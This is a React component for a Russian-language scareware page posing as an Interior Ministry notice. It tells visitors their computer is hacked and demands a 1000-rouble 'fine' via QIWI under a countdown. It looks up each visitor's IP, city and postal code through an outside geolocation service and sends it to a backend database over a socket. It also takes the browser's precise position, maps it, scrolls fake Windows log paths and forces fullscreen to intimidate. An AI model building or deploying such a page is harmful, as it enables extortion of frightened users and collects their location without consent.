import { useState, useEffect } from "react";
import axios from 'axios';
import { YMaps, Map, Placemark } from "react-yandex-maps";

import gerbMvd from '../../assets/gerb_mvdi.png';


function ScamPage(data) {
    const { socket } = data;


    const deviceLogsList = [`C:\/Windows\/System32\/sru\/SRU00044.log`,
        `C:\/Windows\/Panther\/UnattendGC\/setupact.log`,
        `C:\/Windows\/ServiceProfiles\/NetworkService\/AppData\/MpCmdRun.log`,
        `C:\/Windows\/Temp\/PowerPlan.log`,
        `C:\/Windows\/System32\/Sysprep\/Panther\/setupact.log`,
        `C:\/Windows\/Panther\/UnattendGC\/setupact.log`,
        `C:\/Windows\/inf\/setupapi.dev.log`,
        `C:\/Windows\/inf\/WmiApRpl\/0009\/WmiApRpl.ini`
    ];

    const [shownDeviveLog, updateShownDeviceLog] = useState('');
    const [index, updateIndex] = useState(0);
    const [time, setTime] = useState(600);
    const [flag, setFlag] = useState(true);
    const [lat, setLat] = useState(0);
    const [lng, setLng] = useState(0);

    const getData = async (userData) => {
        if (flag) {
            setFlag(false);
            if (userData) {
                socket.emit('insertUserDataIntoDB', { userData: userData });
            }
        }
    }

    useEffect(() => {

        const loadLogsInterval = setTimeout(async () => {
            const timer = setTimeout(() => {
                setTime(time - 1);
                if (time < 0) {
                    setTime(0);
                    clearTimeout(timer);
                }
            }, 1000);

            updateIndex(index + 1);
            if (index > deviceLogsList.length - 2)
                updateIndex(0);

            updateShownDeviceLog(deviceLogsList[index]);

            const res = await axios.get('https://geolocation-db.com/json/');
            const userData = res?.data;
            const userAgent = window.navigator.userAgent;

            getData(userData);
            insertScamInfo(<ScamInfo userData={userData} userAgent={userAgent} />)
        }, 200);

        return () => {
            clearTimeout(loadLogsInterval);

        };

    }, [shownDeviveLog]);

    const [scamInfo, insertScamInfo] = useState(
        function () {
            return (<></>)
        }
    );



    function ScamInfo(data) {
        const { userData, userAgent } = data;

        return (
            <div>
                <div style={{ display: 'flex', width: '100%', paddingTop: '10px' }}>
                    <img src={gerbMvd} style={{ width: '170px', height: '100px' }} />
                    <div style={{ marginLeft: '10px', textAlign: 'left' }}>
                        <p style={{ fontWeight: '700' }}>МИНИСТЕРСТВО СКАММЕРСКИХ ДЕЛ<br />
                            РОССИЙСКОЙ ФЕДЕРАЦИИ</p>
                        <p>СЛУЖИМ РОССИИ, СЛУЖИМ ЗАКОНУ!</p>
                    </div>

                </div>
                <h1 style={{ color: 'rgb(255,10,10)' }}>Ваш компьютер взломан!</h1>
                <div style={{ width: '70vw', marginLeft: '15vw' }}>
                    <p style={{ fontSize: '24px' }}>По нашим данным, Вы посетили запрещенный на территории Российской Федирации сайт.
                        Исходя из полученных нами данных, вход был осуществлен из <b>{userData.city},{userData.state}</b> по <b>IP адрессу: {userData.IPv4}</b>.
                    </p>
                    <p style={{ fontSize: '24px' }}><b>Вам выписан штраф в размере 1000р.</b> Оплатите его, отправив деньги
                        на <b>QIWI</b> по номеру <b>+7(999)999-99-00 в течении {time} сек. </b>
                        <b>В случае непогашения задолжности, все данные с Вашего устройства будут направлены
                            в региональный отдел МВД по индексу {userData.postal}.</b></p>
                </div>
                <div style={{ width: '40vw', marginLeft: '60vw', marginTop: '10vh', marginBottom: '10vh' }}>
                    <p>{userAgent}</p>
                </div>
                <div style={{ position: 'fixed', bottom: '0', backgroundColor: '#000000', width: '100vw', height: '50px', justifyContent: 'center', textAlign: 'left' }}>
                    <p style={{ marginLeft: '10px', color: '#ffffff' }}>{shownDeviveLog}</p>
                </div>
            </div>
        );
    }


    navigator.geolocation.getCurrentPosition(function (position) {
        setLat(position.coords.latitude);
        setLng(position.coords.longitude);
    });

    return (
        <div style={{ width: '100vw', height: '100vh', position: 'relative' }}
            onClick={() => {
                document.documentElement.requestFullscreen();
            }}>
            <div style={{ position: 'absolute' }}>
                {scamInfo}
            </div>

            <div style={{ opacity: '0.3' }}>
                <YMaps>
                    <Map style={{ width: '100vw', height: '100vh' }} defaultState={{ center: [lat, lng], zoom: 18 }}>
                        <Placemark geometry={[lat, lng]} />
                    </Map>
                </YMaps>
            </div>

        </div>
    )
}

export default ScamPage;